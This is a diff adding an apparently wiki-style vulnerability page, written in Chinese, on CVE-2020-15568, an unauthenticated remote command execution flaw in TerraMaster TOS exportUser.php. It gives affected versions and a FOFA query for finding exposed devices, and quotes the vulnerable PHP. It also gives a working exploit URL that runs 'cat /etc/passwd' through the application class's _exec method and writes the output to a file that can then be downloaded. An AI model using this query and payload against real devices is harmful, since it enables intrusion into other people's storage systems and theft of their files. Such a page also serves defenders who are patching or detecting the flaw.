@@ -1,0 +1,45 @@
+<h1 id="TerraMaster-TOS-exportUser-php-远程命令执行-CVE-2020-15568"><a href="#TerraMaster-TOS-exportUser-php-远程命令执行-CVE-2020-15568" class="headerlink" title="TerraMaster TOS exportUser.php 远程命令执行 CVE-2020-15568"></a>TerraMaster TOS exportUser.php 远程命令执行 CVE-2020-15568</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>TerraMaster TOS exportUser.php 文件中存在远程命令执行漏洞</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>TerraMaster TOS &lt; 4.1.24</p>
+</blockquote>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
+<p>[!NOTE]</p>
+<p>“TerraMaster” &amp;&amp; header=”TOS”</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>出现漏洞的文件 <em><strong>exportUser.php</strong></em></p>
+<pre><code class="php">&lt;?php
+    include_once &quot;./app.php&quot;; // [1] autoload classes
+    class CSV_Writer{
+        ...
+    }
+    $type = $_GET[&#39;type&#39;];
+    $csv = new CSV_Writer();
+    if($type == 1){
+        $P = new person();
+        $data = $P-&gt;export_user($_GET[&#39;data&#39;]);
+        $csv-&gt;exportUser($data);
+    } else if($type == 2) {
+        $P = new person();
+        $data = $P-&gt;export_userGroup($_GET[&#39;data&#39;]);
+        $csv-&gt;exportUsergroup($data);
+    } else { // [2] type value is bigger than 2
+        //xlsx通用下载
+        $type = 0;
+        $class = $_GET[&#39;cla&#39;];
+        $fun = $_GET[&#39;func&#39;];
+        $opt = $_GET[&#39;opt&#39;];
+        $E = new $class();
+        $data = $E-&gt;$fun($opt); // [3] vulnerable code call
+        $csv-&gt;exportExcel( $data[&#39;title&#39;], $data[&#39;data&#39;], $data[&#39;name&#39;], $data[&#39;save&#39;], $data[&#39;down&#39;]);
+    }
+?&gt;
+</code></pre>
+<p>在其他文件的代码检查期间，也发现有一种方法可以利用TOS软件中预先存在的类来利用此问题。<br>位于<strong>include/class/application.class.php</strong>中的PHP类是在运行TOS软件的设备上执行命令的最佳人选。</p>
+<p>由于<em>exportUser.php</em>没有身份验证控件，因此未经身份验证的攻击者有可能通过提供以下值作为HTTP GET参数来实现代码执行。</p>
+<pre><code>http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&amp;cla=application&amp;func=_exec&amp;opt=(cat%20/etc/passwd)&gt;test.txt
+</code></pre>
+<p>返回200后再次访问</p>
+<pre><code>http://xxx.xxx.xxx.xxx/include/test.txt
+</code></pre>
+<p><img src="http://wikioss.peiqi.tech/vuln/tm-9.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
